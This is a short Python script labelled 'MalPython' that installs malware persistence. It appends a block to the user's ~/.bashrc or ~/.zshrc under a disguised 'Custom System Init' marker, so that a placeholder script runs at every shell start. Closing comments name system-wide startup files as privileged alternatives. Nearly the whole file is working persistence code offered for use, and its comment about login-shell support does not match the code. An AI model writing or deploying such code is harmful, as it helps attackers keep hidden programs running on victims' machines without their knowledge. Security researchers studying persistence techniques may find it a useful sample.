# MalPython
#
# Modify user's shell startup file
# Use marker to prevent duplicate entry
#
# Targeting interactive non-login shell (.e.g ~/.bashrc or ~/.zshrc)
# Also support login shell (e.g. ~/.bash_profile or ~/.profile)

from pathlib import Path
import shutil
import datetime
import os

MARKER_START = "# >>> Custom System Init >>>"
MARKER_END = "# <<< Custom System Init <<<"

COMMAND = r'''
python3 /path/to/script.py
'''

def add_to_shell_rc(rc_file: Path, content: str):
    rc_file = rc_file.expanduser()

    if not rc_file.exists():
        rc_file.touch()
    
    original = rc_file.read_text()

    # avoid duplicate if marker found
    if MARKER_START in original and MARKER_END in original:
        return

    # add the entry to the rc file    
    block = f"""
{MARKER_START}
{content}
{MARKER_END}
"""

    with rc_file.open("a") as f:
        f.write(block)

if __name__ == "__main__":
    shell = os.environ.get("SHELL", "")
    if shell.endswith("bash"):
        rc = Path.home() / ".bashrc"
    elif shell.endswith("zsh"):
        rc = Path.home() / ".zshrc"
    else:
        raise RuntimeError(f"Unsupported shell: {shell}")

    add_to_shell_rc(rc, COMMAND)

# Alternatives:
# system-wide shell initialization, require privilege
#   /etc/profile
#   /etc/bash.bashrc (Debian/Ubuntu)
#   /etc/zshrc